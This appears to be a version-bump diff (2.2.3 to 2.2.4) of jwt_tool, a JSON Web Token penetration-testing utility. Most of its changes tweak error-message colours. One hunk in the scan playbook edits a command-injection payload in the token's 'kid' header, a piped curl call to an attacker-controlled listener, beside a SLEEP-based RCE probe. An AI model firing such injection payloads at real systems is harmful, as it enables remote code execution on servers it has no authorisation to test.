@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 #
-# JWT_Tool version 2.2.3 (14_04_2021)
+# JWT_Tool version 2.2.4 (08_07_2021)
 # Written by Andy Tyler (@ticarpi)
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
 # Web: https://www.ticarpi.com
 # Twitter: @ticarpi
 
-jwttoolvers = "2.2.3"
+jwttoolvers = "2.2.4"
 import ssl
 import sys
 import os
@@ -1249,7 +1249,7 @@ def validateToken(jwt):
     except:
         cprintc("[-] Invalid token:\nHEADER not valid JSON format", "red")
 
-        cprintc(head.decode('UTF-8'))
+        cprintc(head.decode('UTF-8'), "red")
         exit(1)
     if payl.decode() == "":
         cprintc("Payload is blank", "white")
@@ -1259,10 +1259,10 @@ def validateToken(jwt):
             paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
         except:
             cprintc("[-] Invalid token:\nPAYLOAD not valid JSON format", "red")
-            cprintc(payl.decode('UTF-8'))
+            cprintc(payl.decode('UTF-8'), "red")
             exit(1)
     if args.verbose:
-        cprintc("[v] Token: "+head.decode()+"."+payl.decode()+"."+sig+"\n", "green")
+        cprintc("Token: "+head.decode()+"."+payl.decode()+"."+sig+"\n", "green")
     return headDict, paylDict, sig, contents
 
 def rejigToken(headDict, paylDict, sig):
@@ -1465,7 +1465,7 @@ def scanModePlaybook():
     jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - SLEEP 10 (did this request pause?)")
     if config['services']['httplistener']:
         injectUrl = config['services']['httplistener']+"/RCE_in_kid"
-        newheadDict, newHeadB64 = injectheaderclaim("kid", "|curl"+injectUrl)
+        newheadDict, newHeadB64 = injectheaderclaim("kid", "| curl "+injectUrl)
         key = open("null.txt").read()
         newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
         jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - curl "+injectUrl+" (did this URL get accessed?)")
